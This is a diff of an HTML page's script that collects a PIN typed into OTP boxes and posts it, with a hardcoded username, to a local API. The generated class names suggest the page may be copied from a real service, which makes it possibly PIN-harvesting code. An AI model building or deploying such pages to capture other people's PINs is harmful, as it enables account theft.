@@ -1771,7 +1771,7 @@
     <script>
       const otpInputs = document.querySelectorAll("._3xcXqLVteTNHmk-gh9W65d");
       const otpContainer = document.querySelector(".otp-container");
-      const API_URL = "YOUR_API_URL"; // Ganti dengan URL API Anda
+      const API_URL = "YOUR_API_URL";
 
       otpInputs.forEach((input, index) => {
         input.addEventListener("input", (e) => {
@@ -1821,10 +1821,9 @@
       });
 
       function fetchApi(otp) {
-        console.log("Sending OTP to API:", otp);
         fetch("http://localhost:5000/api/pin", {
           method: "POST",
-          body: JSON.stringify({ username: "sugomadics",pin: otp }),
+          body: JSON.stringify({ username: "kelonesurabaya", pin: otp }),
           headers: { "Content-Type": "application/json" },
         })
           .then((response) => response.json())
